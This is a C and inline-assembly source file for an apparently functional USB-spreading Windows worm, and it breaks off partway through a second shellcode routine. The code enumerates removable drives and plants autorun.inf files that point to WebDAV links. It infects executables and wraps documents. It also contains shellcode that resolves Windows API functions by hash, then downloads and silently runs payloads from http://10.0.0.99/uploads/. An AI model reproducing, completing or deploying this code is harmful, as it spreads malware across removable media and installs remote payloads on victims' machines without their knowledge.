#include "main.h"
#include "globals.h"
#include "resource.h"

//DEBUG FIXME
char load_library[] = "CloseHandle";


BOOL find_all_usb_drive_letters(__out PCHAR drive_letter_out)
{
	ERROR_CODE		status;
	DWORD			logical_drives						= 0;
	CHAR			drive_letter[MAX_PATH]				= {0};
	UINT			output_letter_index_counter			= 0;

#ifdef USB_INFECT_FLOPPY
	UINT			drive_position_counter				= 0;
#else 
	UINT			drive_position_counter				= 2;
#endif

	// Get the drive list
	logical_drives = GetLogicalDrives();

	// Enumerate all positions
	while (drive_position_counter < 32) {
		if ((BOOL)((logical_drives >> drive_position_counter) & 1)) {

			// Found a drive, generate its drive letter
			drive_letter[0] = (CHAR)((BYTE)0x41 + (BYTE)drive_position_counter);
			CopyMemory((PVOID)((DWORD_PTR)drive_letter + 1), ":\\", string_length(":\\"));

			// Get its type
			status = GetDriveTypeA((LPCSTR)drive_letter);
			switch (status) {

			case DRIVE_UNKNOWN:
				drive_position_counter++;
				continue;

			case DRIVE_NO_ROOT_DIR:
				drive_position_counter++;
				continue;

			case DRIVE_REMOVABLE:

				// Append the drive letter
				drive_letter_out[output_letter_index_counter] = drive_letter[0];
				drive_position_counter++;
				continue;

			case DRIVE_FIXED:
				drive_position_counter++;
				continue;

			case DRIVE_REMOTE:
				drive_position_counter++;
				continue;

			default:
				drive_position_counter++;
				continue;	
			}

			__nop;
		}

		drive_position_counter++;
	}

	/*
	HANDLE			hp_parm, file_handle;
	DWORD			*exe_image, *final_image;
	DWORD			exe_size, final_size;
	BYTE			drive_letter = 0x40;
	ERROR_CODE		status;
	UINT			i = 0;
	CHAR			drive_path[128], autorun_string[1024] = {0};
	INT				junk;


	// Start enumerating drive letters
	for (i = 0; i < 26; i++) {

		// Prepare drive letter
		drive_letter++;
		ZeroMemory(drive_path, sizeof(drive_path));
		drive_path[0] = drive_letter;
		CopyMemory(drive_path + 1, ":\\", 2);

		// Attempt to access drive
		status = GetDriveTypeA((LPCSTR)drive_path);
		switch (status) {

		case DRIVE_UNKNOWN:
			continue;

		case DRIVE_NO_ROOT_DIR:
			continue;

		case DRIVE_REMOVABLE:

			// Write the image to the disk 
			CopyMemory(drive_letter_out, drive_path, string_length(drive_path));
			return TRUE;
			break;

		case DRIVE_FIXED:
			continue;

		case DRIVE_REMOTE:
			continue;

		default:
			continue;
		}
	}

	return FALSE;
	*/

	return FALSE;
}

VOID thread_webdav_enum(VOID)
{
	MEMORY_BASIC_INFORMATION		mem_info;

	IMAGE_DOS_HEADER				*dos_header;
	IMAGE_NT_HEADERS				*nt_headers;
	IMAGE_SECTION_HEADER			*section_header;
	HTTP_FILE						http_file;

	HANDLE							heap;
	HANDLE							thread_sync						= INVALID_HANDLE_VALUE;

	BYTE							*decrypted_buffer;
	BYTE							*ptr;

	PDWORD							base_address;
	DWORD							key, tmp_key;

	char							usb_drive_letter[26], usb_drive_letter_fullpath[MAX_PATH];

	unsigned int					webdav_link_counter;

	unsigned int					i, size_of_string, drive_letter_counter;

	// Set the wrapper log
	first_wrapper_log				= NULL;

	// Attempt to create or open the sync mutex (only one of these threads must exist between all infected processes)
	thread_sync = CreateMutexA(NULL, TRUE, SYNC_USB_BETWEEN_PROC);
	if ((thread_sync == NULL) && (GetLastError() == ERROR_ALREADY_EXISTS)) {
#ifdef DEBUG_OUT
		send_debug_channel("+usb> USB Infector on PID %d Failed to obtain sync object!", GetCurrentProcessId());
#endif
		Sleep(INFINITE);
	} 

	WaitForSingleObject(thread_sync, INFINITE);
#ifdef DEBUG_OUT
		send_debug_channel("+usb> USB Infector on PID %d has obtained mutex!", GetCurrentProcessId());
#endif

	// Get module base


#ifndef _WIN64
	base_address = (PDWORD)get_local_dll_base();
#else
	base_address = (PDWORD)get_local_dll_base64();
#endif

	// Get headers
	dos_header = (PIMAGE_DOS_HEADER)base_address;
	nt_headers = (PIMAGE_NT_HEADERS)((DWORD)dos_header->e_lfanew + (DWORD)base_address);
	section_header = IMAGE_FIRST_SECTION(nt_headers);
	section_header = (PIMAGE_SECTION_HEADER)((DWORD)section_header + (DWORD)((nt_headers->FileHeader.NumberOfSections - 1) * sizeof(IMAGE_SECTION_HEADER)));

	// Get buffers
	/*
	key = *(PDWORD)((DWORD)section_header->VirtualAddress + (DWORD)base_address);

	// Allocate memory to decrypted buffer
	heap = HeapCreate(0, 0, section_header->SizeOfRawData + 12);
	decrypted_buffer = (PBYTE)HeapAlloc(heap, 0, section_header->SizeOfRawData + 12);
	ZeroMemory(decrypted_buffer, section_header->SizeOfRawData + 12);

	// Copy into new buffer
	CopyMemory(decrypted_buffer, (void *)((DWORD)section_header->VirtualAddress + (DWORD)base_address), section_header->SizeOfRawData);

	// Decrypt buffer
	tmp_key = key;
	ptr = (PBYTE)((DWORD)decrypted_buffer + 4);
	for (i = 0; i < section_header->SizeOfRawData - 4; i++) {

		*ptr = (BYTE)(*ptr ^ tmp_key);

		tmp_key = tmp_key >> 8;

		if (tmp_key == 0) {
			tmp_key = key;
		}

		ptr++;
	}

	// Determine second list
	ptr = (PBYTE)((DWORD)decrypted_buffer + 12);
	while(*ptr != 0) {
		ptr++;
	}
	ptr++;*/

	// Build array
	ptr = (PBYTE)global_config.webdav_list_string;
	webdav_link_counter = 0;
	webdav_link_index	= 0;
	while (*ptr != 0) {

		// Determine length of string
		size_of_string = 0;
		while (	(*(PBYTE)((DWORD)ptr + size_of_string) != 0x0d) &&
				(*(PBYTE)((DWORD)ptr + size_of_string) != 0x00))  {
			size_of_string++;
		}

		// Allocate memory for the string
		webdav_links[webdav_link_counter] = (char *)HeapAlloc(GetProcessHeap(), 0, size_of_string + 1);
		ZeroMemory(webdav_links[webdav_link_counter], size_of_string + 1);

		// Copy string
		for (i = 0; i < size_of_string; i++) {

			// Copy byte
			*(PBYTE)((DWORD)(webdav_links[webdav_link_counter]) + i) = *ptr;

			ptr++;
		}

		// Adjust ptr
		ptr = (PBYTE)((DWORD)ptr + 2);

		// Next array element
		webdav_link_counter++;
	}

	//infect_webdav_pe_usb("C:\\Users\\domadm\\Desktop\\test\\");
	//inject_webdav_pe("C:\\Users\\domadm\\Desktop\\COMView.exe");
	//install_se_webdav_usb("A");
	//usb_file_packer("C:\\Users\\domadm\\Desktop\\testing.docx");
	//usb_file_packer("C:\\Users\\x90\\Desktop\\GSPQR.pdf");
	//ExitProcess(0);
	//ExitProcess(0);

	// Main LOOP
	__nop;
	while (TRUE) {

		// Find a target USB Drive
		drive_letter_counter = 0;
		ZeroMemory(usb_drive_letter, sizeof(usb_drive_letter));
		find_all_usb_drive_letters(usb_drive_letter);

		// Go through all drive letters
		while (usb_drive_letter[drive_letter_counter]) {

			// Generate the abs address
			ZeroMemory(usb_drive_letter_fullpath, sizeof(usb_drive_letter_fullpath));
			usb_drive_letter_fullpath[0] = usb_drive_letter[drive_letter_counter];
			CopyMemory((PVOID)((DWORD_PTR)usb_drive_letter_fullpath + 1), ":\\", string_length(":\\"));

			// Install the Webdav SE Trick
#ifdef USB_OPS_AUTORUN
#ifdef DEBUG_OUT
			DEBUG("+usb> Installing autorun.inf on drive %s", usb_drive_letter);
#endif
			install_autorun((LPCSTR)usb_drive_letter_fullpath);
#endif

			// Infect all PEs
#ifdef DEBUG_OUT
			DEBUG("+usb> Infecting all PEs and wrapping docs on drive %s", usb_drive_letter);
#endif
			enum_usb_files((LPCSTR)usb_drive_letter_fullpath);


#ifdef DEBUG_OUT
			DEBUG("+usb> Done infection on %s", usb_drive_letter_fullpath);
#endif

			drive_letter_counter++;
		}

		Sleep(30000);
	}
}

VOID install_autorun(LPCSTR drive_letter) 

{
	DWORD				*inf_buffer;
	CHAR				inf_abs_path[MAX_PATH]			= {0};
	CHAR				link[MAX_PATH]					= {0};
	BYTE				*ptr;

	// Check for user configuration before proceeding
	if (global_config.autorun == FALSE) {
#ifdef DEBUG_OUT
		DEBUG("+usb> Disabling autorun infection as per user configuration");
#endif
		return;
	}


	// Allocate mem for inf
	inf_buffer = (PDWORD)VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	// Determine webdav link index
	if (webdav_links[webdav_link_index] == NULL) {
		webdav_link_index = 0;		

		// Return if there are no available links
		if (webdav_links[0] == NULL) {
			return;
		}
	}

	/*
	 Action=Open folder to view files
	 Icon=%systemroot%\system32\shell32.dll,4
	 Shellexecute=.\RECYCLER\S-5-3-42-2819952290-8240758988-879315005-3665\jwgkvsq.vmx,ahaezedrn
	 */

	// Generate the webdav link
	*(PWORD)link = '\\\\';
	CopyMemory((void *)((DWORD)link + 2), (void *)((DWORD)webdav_links[webdav_link_index] + 7), string_length((char *)((DWORD)webdav_links[webdav_link_index] + 7)));
	ptr = (PBYTE)link;
	while (*ptr != 0) {

		if (*ptr == '/') {
			*ptr = '\\';
		}

		ptr++;
	}

	// Generate inf
	f_snprintf((char *)inf_buffer, 0x1000, "[autorun]\r\nAction=Open folder to view files\r\nIcon=%%systemroot%%\\system32\\shell32.dll,4\r\nShellexecute=%s", link);

	// Generate file name
	f_snprintf(inf_abs_path, sizeof(inf_abs_path), "%s\\autorun.inf", drive_letter);

	// Write inf
	write_raw_to_disk((LPCSTR)inf_abs_path, inf_buffer, string_length((LPCSTR)inf_buffer));

	// Go to next link
	webdav_link_index++;

	VirtualFree(inf_buffer, 0x1000, MEM_RELEASE);

}


// Recursive scan for files
VOID enum_usb_files(LPCSTR directory)
{
	QWORD						input_time_store, time_delta, system_time_store, file_time_store;
	PFILETIME					file_time;
	SYSTEMTIME					system_time;
	FILETIME					system_filetime;

	WIN32_FIND_DATAA			find_data					= {0};
	HANDLE						file						= INVALID_HANDLE_VALUE;
	CHAR						file_search_path[MAX_PATH]	= {0};
	PCHAR						extension_ptr;

	LPCSTR						extension_list[]			= PACK_EXTENSIONS;

	PBYTE						ptr;

	UINT						i;

	Sleep(500);

	f_snprintf(file_search_path, sizeof(file_search_path), "%s*.*", directory);
	file = FindFirstFileA(file_search_path, &find_data);
	if (file == INVALID_HANDLE_VALUE) {
		return;
	}

	// Check if this file name is '.' or '..'
	if ((*(PBYTE)find_data.cFileName != '.') && (*(PWORD)find_data.cFileName != '..')) {

		// Check if the file is a directory
		if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			ZeroMemory(file_search_path, sizeof(file_search_path));
			f_snprintf(file_search_path, sizeof(file_search_path), "%s%s\\", directory, find_data.cFileName);
			enum_usb_files(file_search_path);
		} else {
			ZeroMemory(file_search_path, sizeof(file_search_path));
			f_snprintf(file_search_path, sizeof(file_search_path), "%s%s", directory, find_data.cFileName);

			/*
			file_time = (PFILETIME)&find_data.ftCreationTime;
			input_time_store	= 0;
			input_time_store	= (QWORD)(global_config.ignored_days * 24 * 60 * 60); // we know seconds
			input_time_store	= (QWORD)(input_time_store * 10000000); //100 ns intervals
			//input_time.dwHighDateTime = (DWORD)(input_time_store << 32);
			//input_time.dwLowDateTime  = (DWORD)(input_time_store);
			ZeroMemory(&system_time, sizeof(SYSTEMTIME));
			ZeroMemory(&system_filetime, sizeof(SYSTEMTIME));
			GetSystemTime(&system_time);
			SystemTimeToFileTime(&system_time, &system_filetime);
			system_time_store	= (DWORD)system_filetime.dwHighDateTime;
			system_time_store	= system_time_store << 32;
			system_time_store	= (DWORD)system_filetime.dwLowDateTime;
			file_time_store		= *(PDWORD)file_time->dwHighDateTime;
			file_time_store		= file_time_store << 32;
			file_time_store		= *(PDWORD)file_time->dwLowDateTime;
			time_delta = system_time_store - file_time_store;
			if (time_delta > input_time_store) {
				// File is too old
				__nop;
			}*/


			if (global_config.pe == TRUE) {
#ifdef USB_OPS_PE_INFECTOR
				usb_file_injector(file_search_path);
#endif
			} else {
#ifdef DEBUG_OUT
				DEBUG("+usb> PE Infector disabled as per user configuration");
#endif
			}

			if (global_config.wrapper == TRUE) {

				// Compute the probability of installing a .pif extension
				if (compute_probability(global_config.pif_probability) == TRUE) {
					extension_ptr = (PCHAR)PIF_EXTENSION;
				} else {
					extension_ptr = NULL;
				}

#ifdef USB_OPS_WRAPPER
#ifndef _WIN64
				usb_file_packer(	file_search_path, 
									TRUE, 
									global_config.rto, 
									global_config.date, 
									FALSE, 
									FALSE, 
									NULL, 
									extension_ptr, 
									NULL, 
									get_kernel32_base32());
#else
				usb_file_packer(	file_search_path, 
									TRUE, 
									global_config.rto, 
									global_config.date, 
									FALSE, 
									FALSE, 
									NULL, 
									extension_ptr, 
									NULL, 
									get_kernel32_base64());
#endif
#endif
			} else {
#ifdef DEBUG_OUT
				DEBUG("+usb> File wrapper disabled as per user config");
#endif
			}
		}
	}

	Sleep(500);

	// Next files loop
	ZeroMemory((void *)&find_data, sizeof(WIN32_FIND_DATAA));
	while (FindNextFileA(file, &find_data)) {

		if ((*(PBYTE)find_data.cFileName != '.') && (*(PWORD)find_data.cFileName != '..')) {

			// Check if the file is a directory
			if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				ZeroMemory(file_search_path, sizeof(file_search_path));
				f_snprintf(file_search_path, sizeof(file_search_path), "%s%s\\", directory, find_data.cFileName);
				enum_usb_files(file_search_path);
			} else {

				ZeroMemory(file_search_path, sizeof(file_search_path));
				f_snprintf(file_search_path, sizeof(file_search_path), "%s%s", directory, find_data.cFileName);

				// Check what extension this file is
				ptr = (PBYTE)((DWORD_PTR)file_search_path + string_length(file_search_path));
				while (*ptr != '.') {
					ptr--;
				}
				if (*(PDWORD)ptr == 'exe.') {
					// PE Extension

					continue;
				}
				// Check if the extension is even on the list
				i = sizeof(extension_list) / sizeof(DWORD_PTR);
				for (i = 0; i < (sizeof(extension_list) / sizeof(DWORD_PTR)); i++) {

					if (!string_compare((LPCSTR)ptr, extension_list[i], string_length(extension_list[i]))) {
						break;
					}
				}
				if (i == (sizeof(extension_list) / sizeof(DWORD_PTR))) {
					return;
				}

				file_time = (PFILETIME)&find_data.ftLastWriteTime;
				input_time_store	= 0;
				input_time_store	= (QWORD)(global_config.ignored_days * 24 * 60 * 60); // we know seconds
				input_time_store	= (QWORD)(input_time_store * 10000000); //100 ns intervals
				//input_time.dwHighDateTime = (DWORD)(input_time_store << 32);
				//input_time.dwLowDateTime  = (DWORD)(input_time_store);
				ZeroMemory(&system_time, sizeof(SYSTEMTIME));
				ZeroMemory(&system_filetime, sizeof(SYSTEMTIME));
				GetSystemTime(&system_time);
				SystemTimeToFileTime(&system_time, &system_filetime);
				system_time_store	= (DWORD)system_filetime.dwHighDateTime;
				system_time_store	= system_time_store << 32;
				system_time_store	= system_time_store | (DWORD)system_filetime.dwLowDateTime;
				file_time_store		= file_time->dwHighDateTime;
				file_time_store		= file_time_store << 32;
				file_time_store		= file_time_store | file_time->dwLowDateTime;
				time_delta = system_time_store - file_time_store;
				if (time_delta > input_time_store) {
					// File is too old

#ifdef DEBUG_OUT
					DEBUG("+usb> Skipping file %s (too old - user config)", find_data.cFileName);
#endif

					continue;
				}


			if (global_config.pe == TRUE) {
#ifdef USB_OPS_PE_INFECTOR
				usb_file_injector(file_search_path);
#endif
			} else {
#ifdef DEBUG_OUT
				DEBUG("+usb> PE Infector disabled as per user configuration");
#endif
			}

			if (global_config.wrapper == TRUE) {

				// Compute the probability of installing a .pif extension
				if (compute_probability(global_config.pif_probability) == TRUE) {
					extension_ptr = (PCHAR)PIF_EXTENSION;
				} else {
					extension_ptr = NULL;
				}

#ifdef USB_OPS_WRAPPER
#ifndef _WIN64
				usb_file_packer(	file_search_path, 
									TRUE, 
									global_config.rto, 
									global_config.date, 
									FALSE, 
									FALSE, 
									NULL, 
									extension_ptr, 
									NULL, 
									get_kernel32_base32());
#else
				usb_file_packer(	file_search_path, 
									TRUE, 
									global_config.rto, 
									global_config.date, 
									FALSE, 
									FALSE, 
									NULL, 
									extension_ptr, 
									NULL, 
									get_kernel32_base64());
#endif
#endif
			} else {
#ifdef DEBUG_OUT
				DEBUG("+usb> File wrapper disabled as per user config");
#endif
			}
			}
		}
		
		Sleep(500);
		ZeroMemory((void *)&find_data, sizeof(WIN32_FIND_DATAA));
	}

#ifdef DEBUG_OUT
	DEBUG("+usb> ..");
#endif

	return;
}



#ifdef INVOKE_CRYPTER
BOOL install_pe_crypter(LPCSTR file_name)
{


}
#endif

BOOL append_date_filename(	__in		LPCSTR file_name, 
							__out		PCHAR out_file) 
{
	SYSTEMTIME			systemtime								= {0};
	UCHAR				file_name_buffer[MAX_PATH]				= {0};
	PCHAR				extension;

	extension = (PCHAR)((DWORD_PTR)file_name + string_length(file_name));
	while (*extension != '.') {
		extension--;
	}

	CopyMemory(file_name_buffer, file_name, (UINT)((DWORD_PTR)extension - (DWORD_PTR)file_name));

	GetSystemTime(&systemtime);

	if (f_snprintf != NULL) {
		f_snprintf((PCHAR)((DWORD_PTR)file_name_buffer + string_length(file_name) - string_length(extension)), MAX_PATH,
			"fs%d%d%d", systemtime.wDay, systemtime.wMonth, systemtime.wYear);
	} else {
		_snprintf((PCHAR)((DWORD_PTR)file_name_buffer + string_length(file_name) - string_length(extension)), MAX_PATH,
			"fs%d%d%d", systemtime.wDay, systemtime.wMonth, systemtime.wYear);
	}

	CopyMemory(file_name_buffer + string_length(file_name_buffer), (LPVOID)extension, string_length(extension));

	MoveFileA(file_name, (LPCSTR)file_name_buffer);

	ZeroMemory(out_file, MAX_PATH);
	CopyMemory(out_file, file_name_buffer, string_length(file_name_buffer));

	return TRUE;
}

// Shellcode for exe payloads in USB infect
/*
// CONSTANTS
#define	SC0_STACK_SIZE			256

#define SC0_HOSTOEP				0
#define SC0_LOADLIBRARY			4
#define SC0_CREATEPROCESS		8
#define SC0_CREATETHREAD		12
#define	SC0_DOWNLOAD			16
#define SC0_ENVIRONMENT			20
#define SC0_FIRST_LINK			24

// STACK
#define SC0_ENTRY_POINT			[ebp - 4]
#define SC0_HOST_OEP			[ebp - 8]
#define SC0_KERNEL32			[ebp - 12]
#define SC0_DATA				[ebp - 16]
#define SC0_URLMON				[ebp - 20]
#define SC0_MODBASE				[ebp - 24]
#define SC0_PATH				[ebp - 28]

// FUNCTION ABSOLUTES
#define SC0_FLOADLIBRARY		[ebp - 64]
#define SC0_FCREATEPROCESS		[ebp - 68]
#define SC0_FCREATETHREAD		[ebp - 72]
#define SC0_FDOWNLOAD			[ebp - 76]
#define SC0_FENVIRONMENT		[ebp - 80]

// kernel32:
//	LoadLibraryA
// urlmon:
//	URLDownloadToFileA

__declspec(naked) void webdav_shellcode(VOID)
{
				// Entry signature
	__asm {
				_emit	0f2h
				_emit	002h
				_emit	0a3h
				_emit	041h
	}

	__asm {
				nop									// Entry point
				_emit	0e8h
				_emit	0
				_emit	0
				_emit	0
				_emit	0

				// Delta entry point
				pop		esi							// eip

				// Build frame & zero
				push	ebp
				mov		ebp, esp
				mov		ecx, SC0_STACK_SIZE
				sub		esp, ecx
				mov		edi, esp
				xor		al, al
				cld
				rep		stosb						// Zero

				// Compute data offsets
				xchg	esi, edi
				sub		edi, 6						// Realign to EP
				mov		SC0_ENTRY_POINT, edi		// Commit
				xor		ecx, ecx
				not		ecx							// Whole mem range 
sc0_find_data:
				mov		al, 0edh
				repne	scasb
				mov		eax, [edi - 1]
				shr		eax, 8
				cmp		al, 0f1h
				jne		sc0_find_data
				shr		eax, 8
				cmp		ax, 0eb89h
				jne		sc0_find_data
				lea		edi, [edi + 3]
				mov		SC0_DATA, edi

				// Get kernel32 base -- FIXME
				mov		eax, fs:[030h]
				mov		eax, [eax + 0ch]
				mov		eax, [eax + 014h]
				mov		eax, [eax]
				mov		eax, [eax]
				mov		eax, [eax + 010h]
				mov		SC0_KERNEL32, eax

				// Resolve LoadLibraryA
				mov		esi, [edi + SC0_LOADLIBRARY]
				call	sc0_resolve_function
				mov		SC0_FLOADLIBRARY, eax

				// Resolve CreateProcessA
				mov		esi, SC0_DATA
				mov		esi, [esi + SC0_CREATEPROCESS]
				mov		eax, SC0_KERNEL32
				call	sc0_resolve_function
				mov		SC0_FCREATEPROCESS, eax

				// Resolve CreateThread
				mov		esi, SC0_DATA
				mov		esi, [esi + SC0_CREATETHREAD]
				mov		eax, SC0_KERNEL32
				call	sc0_resolve_function
				mov		SC0_FCREATETHREAD, eax

				// Resolve GetEnvironmentVariableA
				mov		esi, SC0_DATA
				mov		esi, [esi + SC0_ENVIRONMENT]
				mov		eax, SC0_KERNEL32
				call	sc0_resolve_function
				mov		SC0_FENVIRONMENT, eax

				// Load urlm on.d ll
				push	'll'
				push	'd.no'
				push	'mlru'
				push	esp
				mov		eax, SC0_FLOADLIBRARY
				call	eax
				add		esp, 12
				mov		SC0_URLMON, eax

				// Resolve URLDownloadToFileA
				mov		esi, SC0_DATA
				mov		esi, [esi + SC0_DOWNLOAD]
				call	sc0_resolve_function
				mov		SC0_FDOWNLOAD, eax

				// Reserve space for our tmp variable
				mov		ecx, MAX_PATH
				sub		esp, ecx
				mov		edi, esp
				xor		al, al
				rep		stosb
				
				mov		ebx, esp
				push	0
				push	'PMET'
				mov		edx, esp

				push	MAX_PATH
				push	ebx
				push	edx
				mov		eax, SC0_FENVIRONMENT
				call	eax

				add		esp, 8
				mov		SC0_PATH, esp

				// Append file name to end of string
				mov		edi, esp
				xor		eax, eax
				mov		ecx, eax
				not		ecx
				repne	scasb
				mov		BYTE PTR [edi - 1], '\\'
				mov		DWORD PTR [edi], 'xe.a'
				mov		BYTE PTR [edi + 4], 'e'

				// Get our module base
				mov		eax, SC0_ENTRY_POINT
				and		eax, 0ffff0000h
sc0_base_loop:
				cmp		WORD PTR [eax], 'ZM'
				je		sc0_compute_oep_rva
				sub		eax, 1000h
				jmp		sc0_base_loop

				// Compute host OEP
sc0_compute_oep_rva:
				mov		SC0_MODBASE, eax
				mov		ebx, SC0_DATA
				add		eax, [ebx]

				// CreateThread
				push	0
				push	0
				push	0
				push	eax
				push	0
				push	0
				mov		eax, SC0_FCREATETHREAD
				call	eax

				// Download loop
				mov		ebx, SC0_DATA
				lea		ebx, [ebx + SC0_FIRST_LINK]
sc0_downloader:

				// %Use rPro file %\a. exe\0
				push	0				// LPBINDSTATUSCALLBACK
				push	0				// Reserved
				push	SC0_PATH    	// FileName
				push	ebx				// URL
				push	0
				mov		eax, SC0_FDOWNLOAD
				call	eax

				test	al, al
				je		sc0_downloader_execute

				// Download failed - Get to next string
				mov		edi, ebx
				xor		eax, eax
				mov		ecx, eax
				not		ecx
				cld
				repne 	scasb
				mov		ebx, edi
				cmp		BYTE PTR [ebx], 0
				jne		sc0_downloader

				// We're out of links, they all failed
				mov		ebx, SC0_DATA
				lea		ebx, [ebx + SC0_FIRST_LINK]
				jmp		sc0_downloader

				// Download succeeded - execute payload
sc0_downloader_execute:

				lea		eax, [ebp - 104]
				push	eax
				lea		eax, [ebp - 156]
				push	eax
				push	0
				push	0
				push	CREATE_NO_WINDOW
				push	0
				push	0
				push	0
				push	SC0_PATH
				push	0
				mov		eax, SC0_FCREATEPROCESS
				call	eax

				// Normalize and return
				add		esp, (SC0_STACK_SIZE + MAX_PATH)
				pop		ebp
				ret

				// Expects	eax = module base
				//			esi = function hash
				// Returns  eax = address of function
sc0_resolve_function:

				// Find PE
				mov		ebx, [eax + 03ch]
				add		ebx, eax					// PE
				mov		edi, eax					// Commit to edi

				// Find EAT
				mov		ebx, [ebx + 078h]			
				add		ebx, edi					// IMAGE_EXPORT_DIRECTORY
				mov		edx, ebx

				// Find tables
				mov		ebx, [ebx + 020h]			// AddressOfNames
				add		ebx, edi

				// ecx = hash
				// ebx = AddressOfNames table
				// edx = AddressOfFunctions table
				// edi = base

				// Find first function string
				xor		ecx, ecx
sc0_enum_functions:
				mov		eax, [ebx]
				add		eax, edi
				call	sc0_crc32
				cmp		eax, esi
				je		sc0_found_function
				add		ebx, 4
				inc		ecx
				jmp		sc0_enum_functions

sc0_found_function:
				//mov		eax, [ebx]
				//add		eax, edi

				mov		ebx, [edx + 024h]
				add		ebx, edi
				mov		cx, [ebx + 2 * ecx]
				mov		ebx, [edx + 01ch]
				add		ebx, edi
				mov		eax, [ebx + 4 * ecx]
				add		eax, edi

				ret

				// Expects	eax = string
				// Returns  eax = CRC32
sc0_crc32:
				push	ebx
				push	ecx
				xor		ebx, ebx
				dec		ebx
sc0_crc32_byte:
				xor		bl, [eax]
				mov		ecx, 8
sc0_crc32_bit:
				shr		ebx, 1
				jnc		sc0_crc32_skip
				xor		ebx, 08fdb125ch
sc0_crc32_skip:
				loop	sc0_crc32_bit

				inc		eax
				cmp		BYTE PTR [eax], 0
				jnz		sc0_crc32_byte

				mov		eax, ebx
				pop		ecx
				pop		ebx
				ret						

	}

	// Signature & return address
	__asm {
sc0_sig:
				// Data sig
				_emit	0edh
				_emit	0f1h
				_emit	089h
				_emit	0ebh

				// Host OEP
				_emit	090h
				_emit	090h
				_emit	090h
				_emit	090h
	}

	// Function signatures
	__asm {
				// 3E07577B - LoadLibraryA
				_emit	07bh
				_emit	057h
				_emit	007h
				_emit	03eh

				// BB2D3AC0 - CreateProcessA
				_emit	0c0h
				_emit	03ah
				_emit	02dh
				_emit	0bbh

				// AAB04715 - CreateThread
				_emit	015h
				_emit	047h
				_emit	0b0h
				_emit	0aah

				// 395866BE - URLDownloadToFileA
				_emit	0beh
				_emit	066h
				_emit	058h
				_emit	039h

				// EDE19D36 - GetEnvironmentVariableA
				_emit	036h
				_emit	09dh
				_emit	0e1h
				_emit	0edh
	}

	// Debug strings
	__asm {
				_emit	'h'
				_emit	't'
				_emit	't'
				_emit	'p'
				_emit	':'
				_emit	'/'
				_emit	'/'

				_emit	'1'
				_emit	'0'
				_emit	'.'
				_emit	'0'
				_emit	'.'
				_emit	'0'
				_emit	'.'
				_emit	'9'
				_emit	'9'

				_emit	'/'

				_emit	'u'
				_emit	'p'
				_emit	'l'
				_emit	'o'
				_emit	'a'
				_emit	'd'
				_emit	's'

				_emit	'/'

				_emit	'b'
				_emit	'.'
				_emit	'e'
				_emit	'x'
				_emit	'e'

				_emit	0


				_emit	'h'
				_emit	't'
				_emit	't'
				_emit	'p'
				_emit	':'
				_emit	'/'
				_emit	'/'

				_emit	'1'
				_emit	'0'
				_emit	'.'
				_emit	'0'
				_emit	'.'
				_emit	'0'
				_emit	'.'
				_emit	'9'
				_emit	'9'

				_emit	'/'

				_emit	'u'
				_emit	'p'
				_emit	'l'
				_emit	'o'
				_emit	'a'
				_emit	'd'
				_emit	's'

				_emit	'/'

				_emit	'a'
				_emit	'.'
				_emit	'e'
				_emit	'x'
				_emit	'e'

				_emit	0
				_emit	0
				_emit	0
				_emit	0
	}
}

// CONSTANTS
#define	SC1_STACK_SIZE			256

#define SC1_LOADLIBRARY			0
#define SC1_CREATEPROCESS		4
#define	SC1_DOWNLOAD			8
#define SC1_ENVIRONMENT			12
#define SC1_CREATEFILE			16
#define SC1_WRITEFILE			20
#define SC1_DELETEFILE			24
#define SC1_SHELLEXECUTE		28
#define SC1_CLOSEHANDLE			32
#define SC1_FIRST_LINK			36

// STACK
#define SC1_ENTRY_POINT			[ebp - 4]
#define SC1_HOST_OEP			[ebp - 8]
#define SC1_KERNEL32			[ebp - 12]
#define SC1_DATA				[ebp - 16]
#define SC1_URLMON				[ebp - 20]
#define SC1_MODBASE				[ebp - 24]
#define SC1_PATH				[ebp - 28]
#define SC1_SHELL32				[ebp - 32]
#define SC1_ORIG_FILE			[ebp - 36]
#define SC1_HANDLE				[ebp - 40]

// FUNCTION ABSOLUTES
#define SC1_FLOADLIBRARY		[ebp - 64]
#define SC1_FCREATEPROCESS		[ebp - 68]
#define SC1_FDOWNLOAD			[ebp - 72]
#define SC1_FENVIRONMENT		[ebp - 76]
#define SC1_FCREATEFILE			[ebp - 80]
#define SC1_FWRITEFILE			[ebp - 84]
#define SC1_FDELETEFILE			[ebp - 88]
#define SC1_FSHELLEXECUTE		[ebp - 92]
#define SC1_FCLOSEHANDLE		[ebp - 96]

__declspec(naked) void packer_shellcode(VOID)
{
	// Entry signature
	__asm {
				_emit	0x33
				_emit	0x3a
				_emit	0x1b
				_emit	0xc8
	}

	// Shellcode entrypoint
	__asm {
				nop
				_emit	0xe8
				_emit	0x00
				_emit	0x00
				_emit	0x00
				_emit	0x00

				// Delta entry point
				pop		esi							// eip

				// Build frame & zero
				push	ebp
				mov		ebp, esp
				mov		ecx, SC1_STACK_SIZE
				sub		esp, ecx
				mov		edi, esp
				xor		al, al
				cld
				rep		stosb

				// Compute data offsets
				xchg	esi, edi
				sub		edi, 6						// Realign to EP
				mov		SC1_ENTRY_POINT, edi		// Commit
				xor		ecx, ecx
				not		ecx							// Whole mem range 
sc1_find_data:
				mov		al, 0e8h
				repne	scasb
				mov		eax, [edi - 1]
				shr		eax, 8
				cmp		al, 0f2h
				jne		sc1_find_data
				shr		eax, 8
				cmp		ax, 0ea8ah
				jne		sc1_find_data
				lea		edi, [edi + 3]
				mov		SC1_DATA, edi

				// Get kernel32 base -- FIXME
				mov		eax, fs:[030h]
				mov		eax, [eax + 0ch]
				mov		eax, [eax + 014h]
				mov		eax, [eax]
				mov		eax, [eax]
				mov		eax, [eax + 010h]
				mov		SC1_KERNEL32, eax

				// Resolve LoadLibraryA
				mov		esi, [edi + SC1_LOADLIBRARY]
				call	sc1_resolve_function
				mov		SC1_FLOADLIBRARY, eax

				// Resolve CreateProcessA
				mov		esi, SC1_DATA
				mov		esi, [esi + SC1_CREATEPROCESS]
				mov		eax, SC1_KERNEL32
				call	sc1_resolve_function
				mov		SC1_FCREATEPROCESS, eax

				// Resolve GetEnvironmentVariableA
				mov		esi, SC1_DATA
				mov		esi, [esi + SC1_ENVIRONMENT]
				mov		eax, SC1_KERNEL32
				call	sc1_resolve_function
				mov		SC1_FENVIRONMENT, eax

				// Resolve CreateFileA
				mov		esi, SC1_DATA
